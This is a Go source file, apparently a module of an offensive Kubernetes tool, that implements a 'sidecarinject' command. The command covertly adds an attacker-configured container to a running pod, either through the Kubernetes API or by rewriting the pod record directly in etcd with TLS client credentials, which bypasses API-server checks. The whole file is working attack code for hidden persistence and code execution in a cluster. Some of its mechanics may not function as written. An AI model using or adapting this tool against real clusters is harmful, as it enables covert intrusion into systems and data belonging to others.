package modules

import (
	"context"
	"encoding/json"
	"fmt"
	"kubeshadow/pkg/etcd"
	"kubeshadow/pkg/k8s"
	"os"

	"github.com/spf13/cobra"
	v1 "k8s.io/api/core/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
)

type SidecarConfig struct {
	Name  string             `json:"name"`
	Image string             `json:"image"`
	Env   []v1.EnvVar        `json:"env,omitempty"`
	Ports []v1.ContainerPort `json:"ports,omitempty"`
	Cmd   []string           `json:"command,omitempty"`
	Args  []string           `json:"args,omitempty"`
}

// Cobra command
var SidecarInjectCmd = &cobra.Command{
	Use:   "sidecarinject",
	Short: "Inject a stealthy sidecar container into a running pod (API or etcd)",
	RunE: func(cmd *cobra.Command, args []string) error {
		mode, _ := cmd.Flags().GetString("mode") // api or etcd
		podname, _ := cmd.Flags().GetString("pod")
		namespace, _ := cmd.Flags().GetString("namespace")
		configFile, _ := cmd.Flags().GetString("config")

		if mode == "api" {
			return injectSidecarViaAPI(podname, namespace, configFile)
		} else if mode == "etcd" {
			ep, _ := cmd.Flags().GetString("endpoint")
			cert, _ := cmd.Flags().GetString("cert")
			key, _ := cmd.Flags().GetString("key")
			ca, _ := cmd.Flags().GetString("ca")
			return injectSidecarViaEtcd(ep, cert, key, ca, podname, namespace, configFile)
		}
		return fmt.Errorf("❌ unknown mode: %s", mode)
	},
}

func init() {
	SidecarInjectCmd.Flags().String("mode", "api", "Mode of injection: api or etcd")
	SidecarInjectCmd.Flags().String("pod", "", "Target pod name")
	SidecarInjectCmd.Flags().String("namespace", "default", "Pod namespace")
	SidecarInjectCmd.Flags().String("config", "", "Path to sidecar config JSON")

	// etcd flags
	SidecarInjectCmd.Flags().String("endpoint", "", "etcd HTTPS endpoint (required if mode=etcd)")
	SidecarInjectCmd.Flags().String("cert", "", "TLS client cert (mode=etcd)")
	SidecarInjectCmd.Flags().String("key", "", "TLS client key (mode=etcd)")
	SidecarInjectCmd.Flags().String("ca", "", "CA cert (mode=etcd)")
}

func injectSidecarViaAPI(podName, namespace, configFile string) error {
	clientset, err := k8s.GetClient()
	if err != nil {
		return err
	}

	sidecar, err := loadSidecarConfig(configFile)
	if err != nil {
		return err
	}

	pod, err := clientset.CoreV1().Pods(namespace).Get(context.Background(), podName, metav1.GetOptions{})
	if err != nil {
		return fmt.Errorf("❌ failed to fetch pod: %v", err)
	}

	// Inject sidecar
	pod.Spec.Containers = append(pod.Spec.Containers, *sidecar)

	_, err = clientset.CoreV1().Pods(namespace).Update(context.Background(), pod, metav1.UpdateOptions{})
	if err != nil {
		return fmt.Errorf("❌ failed to update pod: %v", err)
	}
	fmt.Println("✅ Sidecar injected via Kubernetes API.")
	return nil
}

func injectSidecarViaEtcd(endpoint, cert, key, ca, podName, namespace, configFile string) error {
	client, err := etcd.CreateEtcdClient(endpoint, cert, key, ca)
	if err != nil {
		return err
	}
	defer client.Close()

	keyPath := fmt.Sprintf("/registry/pods/%s/%s", namespace, podName)
	resp, err := client.Get(context.Background(), keyPath)
	if err != nil || len(resp.Kvs) == 0 {
		return fmt.Errorf("❌ failed to retrieve pod from etcd: %v", err)
	}

	var pod v1.Pod
	err = json.Unmarshal(resp.Kvs[0].Value, &pod)
	if err != nil {
		return fmt.Errorf("❌ failed to decode pod from etcd: %v", err)
	}

	sidecar, err := loadSidecarConfig(configFile)
	if err != nil {
		return err
	}
	pod.Spec.Containers = append(pod.Spec.Containers, *sidecar)

	raw, err := json.Marshal(pod)
	if err != nil {
		return fmt.Errorf("❌ failed to marshal modified pod: %v", err)
	}

	_, err = client.Put(context.Background(), keyPath, string(raw))
	if err != nil {
		return fmt.Errorf("❌ failed to push pod to etcd: %v", err)
	}

	fmt.Println("✅ Sidecar injected via etcd.")
	return nil
}

func loadSidecarConfig(path string) (*v1.Container, error) {
	raw, err := os.ReadFile(path)
	if err != nil {
		return nil, fmt.Errorf("❌ failed to read config file: %v", err)
	}
	var conf SidecarConfig
	if err := json.Unmarshal(raw, &conf); err != nil {
		return nil, fmt.Errorf("❌ invalid JSON: %v", err)
	}

	return &v1.Container{
		Name:    conf.Name,
		Image:   conf.Image,
		Command: conf.Cmd,
		Args:    conf.Args,
		Env:     conf.Env,
		Ports:   conf.Ports,
	}, nil
}
